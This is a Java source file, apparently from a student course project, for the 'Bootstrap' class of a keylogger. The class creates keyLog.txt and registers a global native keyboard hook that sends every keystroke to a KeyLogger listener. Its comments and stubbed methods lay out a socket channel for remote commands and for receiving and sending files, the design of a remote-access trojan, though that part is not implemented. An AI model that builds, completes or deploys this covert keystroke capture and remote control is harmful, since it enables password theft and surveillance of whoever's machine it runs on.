package edu.wit.comp2100;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;

import java.io.File;
import java.io.IOException;
import java.lang.annotation.Native;
import java.nio.file.Path;

public class Bootstrap {

    private static final Path DEFAULT_KEYLOG_PATH = null; //TODO decide on default path
    private static final Path DEFAULT_FILE_PATH = null; //TODO reference path where bootstrap is running/stored
    private File lastReceivedFile;
    private static File keyLogFile;

    /*
    Starts listener thread
     */
    public static void main(String[] args) throws IOException{

        start();

    }

    /*
     Starts listener thread
     Listener thread will take input from socket
     Create string array from input
     Pass string array to parseCommand
      */
    private static void start() throws IOException{

        //TODO: implement this method

        keyLogFile = new File("keyLog.txt");
        System.out.println("Keylog file created: " + keyLogFile.createNewFile() +
                "\n Starting keylogger... ");

        startKeylogger(keyLogFile);
    }

    /*
    Listen invokes this method when it receives a message over the socket
    preforms actions based on arguments
     */
    private void parseCommand(String[] args){

        //TODO: implemnt this method

    }

    /*
    Starts global key-logger thread
    thread will take input-stream from keyboard
    and input it into a file
     */
    private static void startKeylogger(File keyLogFile) throws IOException {

        try{
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e){
            System.err.println("Problem registering native hook");
            System.err.println(e.getMessage());

           System.exit(1);
        }

        GlobalScreen.addNativeKeyListener(new KeyLogger(keyLogFile)); //TODO IOException could be thrown here


    }

    /*
    Wrapper method to put received files in pre-defined path
     */
    private void recieveFile(){
        recieveFile(DEFAULT_FILE_PATH);
    }

    /*
    Receives file from socket and puts it in the defined path
    uses lastRecievedFile for temporary storage as an object
     */
    private void recieveFile(Path filePath){
        //
        //        //TODO: implement this method

    }

    private void sendFile(){

    }



}
